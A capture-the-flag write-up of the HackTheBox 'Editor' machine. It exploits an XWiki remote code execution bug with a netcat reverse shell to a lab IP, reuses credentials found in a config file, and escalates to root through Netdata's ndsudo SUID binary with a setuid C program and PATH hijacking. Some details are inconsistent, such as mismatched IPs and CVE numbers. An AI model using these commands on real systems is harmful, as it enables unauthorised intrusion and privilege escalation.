
# 📙Editor HTB Writeup
* **Machine Type**: Linux  
* **Solved by**: Akshat Nigam  
* **Category**: Web Exploitation, RCE, Privilege Escalation  
* **Difficulty**: Medium  
* **Attack Surface**: Web Application, XWiki RCE, SSH Access, SUID Exploitation  
## Nmap Scan
```bash
nmap -sC -sV editor.htb -v
````

```
2/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Editor - SimplistCode Pro
8080/tcp open  http    Jetty 10.0.20
| http-title: XWiki - Main - Intro

```

---

## Step 1 — Service Enumeration

* **Port 8080** revealed an **XWiki instance**.
* Checked the version at the bottom of the page:

```
XWiki Version: 15.10.8
```

---

## Step 2 — Vulnerability Identification

* Found **CVE-2025-24893** affecting XWiki `< 15.10.11`.
* Public PoC: (https://github.com/gunzf0x/CVE-2025-24893)

---

## Step 3 — Exploitation (Reverse Shell)

```bash
python CVE-2024-24893.py -t http://editor.htb:8080/ -c 'busybox nc 10.10.14.4 4444 -e /bin/bash'
```

---

## Step 4 — Credential Discovery

* Found credentials in `hibernate.cfg.xml`.
* Reused for SSH login:

```bash
ssh oliver@editor.htb
```

---

## Step 5 — Privilege Escalation (ndsudo Exploit)

* Found **SUID binary**:

```bash
find / -type f -perm -4000 -user root 2>/dev/null
```

* Noticed `/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo` (vulnerable to **CVE-2024-32019**).

---

## Step 6 — Exploit Preparation

**Exploit C code (`exploit.c`):**

```c
#include <unistd.h>

int main() {
    setuid(0); setgid(0);
    execl("/bin/bash", "bash", NULL);
    return 0;
}
```

**Compile locally:**

```bash
gcc exploit.c -o nvme
```

**Host file:**

```bash
python3 -m http.server
```

---

## Step 7 — Upload & Execution on Target

```bash
wget http://10.10.15.4/nvme
chmod +x nvme
export PATH=/var:$PATH
./ndsudo nvme-list
```

---

## Root Access Achieved 🎯

* Successfully obtained a root shell.
* Mission complete.




